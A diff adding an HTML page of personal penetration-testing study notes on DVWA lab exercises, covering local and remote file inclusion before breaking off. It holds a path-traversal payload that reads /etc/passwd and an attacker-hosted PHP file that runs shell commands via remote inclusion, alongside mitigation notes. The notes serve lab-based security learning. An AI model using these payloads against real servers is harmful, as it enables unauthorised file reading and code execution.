@@ -1,0 +1,55 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>05_dvwa_lessons</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+<style>body{padding-top:1rem}.sidebar{height:100vh;position:sticky;top:0;overflow:auto}.content{padding:1.5rem}pre{white-space:pre-wrap}</style>
+</head><body><div class="container-fluid"><div class="row">
+<nav class="col-md-3 col-lg-2 d-md-block bg-light sidebar collapse show"><div class="position-sticky pt-3 sidebar"><h5 class="px-3">PKS Notes</h5><ul class="nav flex-column px-2"><li class="nav-item"><a class="nav-link " href="Notes/01_fundamentals.html">01 — Fundamentals</a></li><li class="nav-item"><a class="nav-link " href="Notes/02_pen_test.html">02 — Pen Test Lifecycle</a></li><li class="nav-item"><a class="nav-link " href="Notes/04_tools_and_env.html">04 — Tools &amp; Environment</a></li><li class="nav-item"><a class="nav-link fw-bold" href="Notes/05_dvwa_lessons.html">05 — DVWA Hands-on Lessons</a></li><li class="nav-item"><a class="nav-link " href="Notes/personal_notes.html">Personal Notes</a></li></ul></div></nav><main class='col-md-9 ms-sm-auto col-lg-10 px-md-4 content'><div class='container'><h1>05 — DVWA Hands-on Lessons</h1>
+<p></p>
+<p>> Lab environment: DVWA running in Docker (local). DVWA security level used: Low (for exploitation demonstration).</p>
+<p></p>
+<p>---</p>
+<p></p>
+<h2>Summary of practical lessons</h2>
+<p>This document records my hands-on practice for several web vulnerabilities: LFI, RFI, SQLi, XSS, command injection, and file upload. Each section includes the steps I performed, sample payloads, what to capture as evidence, and defensive takeaways.</p>
+<p></p>
+<p>---</p>
+<p></p>
+<h3>A — Local File Inclusion (LFI)</h3>
+<p>**Goal:** Read local files by abusing an include parameter (e.g., `?page=`).</p>
+<p></p>
+<p>**Steps I followed**</p>
+<p>1. Set DVWA security to *Low*.</p>
+<p>2. Open DVWA → Vulnerabilities → File Inclusion.</p>
+<p>3. Try basic traversal: `?page=../../../../etc/passwd` (increase `../` depth as needed).</p>
+<p>4. If content appears, screenshot the page showing `/etc/passwd` or similar file contents.</p>
+<p></p>
+<p>**Evidence to capture**</p>
+<ul>
+<li>Screenshot: DVWA File Inclusion page with `/etc/passwd` output visible.</li>
+</ul>
+<p></p>
+<p>**Notes & escalation**</p>
+<ul>
+<li>LFI becomes RCE via log poisoning or including session/temp files that contain PHP code.</li>
+<li>Mitigation: whitelist include values; do not use user-supplied paths directly in `include()` or `require()`.</li>
+</ul>
+<p></p>
+<p>---</p>
+<p></p>
+<h3>B — Remote File Inclusion (RFI)</h3>
+<p>**Goal:** Make the server include and execute a remote PHP file you host.</p>
+<p></p>
+<p>**Core requirements**</p>
+<ul>
+<li>The server&#x27;s PHP must have `allow_url_include = On` (check via `phpinfo()`).</li>
+<li>You must be able to host a reachable HTTP file (e.g., `http://&lt;host&gt;:8000/rfi.php`).</li>
+</ul>
+<p></p>
+<p>**Steps I performed**</p>
+<p>1. Create payload on host (example file `rfi.php`):</p>
+<pre><code>
+   &lt;?php echo shell_exec(&quot;whoami&quot;); ?&gt;
+
+
+
+
+</code></pre></div></main></div></div><script src='https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js'></script></body></html>
